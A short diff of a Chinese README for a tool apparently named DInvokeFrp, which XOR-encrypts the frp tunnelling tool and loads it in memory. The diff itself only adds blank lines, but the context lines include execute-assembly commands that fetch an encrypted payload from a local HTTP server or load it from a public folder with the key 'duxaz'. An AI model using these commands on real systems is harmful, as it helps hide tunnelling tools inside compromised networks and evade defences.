@@ -11,6 +11,7 @@
 0x1 配置
 00x1 使用XORTool进行frp加密
 选择需要加密的frp文件，默认文件加密密钥为duxaz
+
 <img width="415" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/2e3be9ed-5491-44dc-8429-3075b1752770">
 
 
@@ -48,6 +49,7 @@ execute-assembly DInvokeSU.exe --url http://192.168.124.1:8080/main.bin 加密�
 
 落地加密frp
 execute-assembly DInvokeSU.exe --file C:\Users\Public\main.bin 加密配置 --key duxaz
+
 <img width="416" alt="image" src="https://github.com/T0ngF0ngnie/DInvokeFrp/assets/68188237/c130190f-246d-4f8b-b1d6-48f953758a3e">
 
 
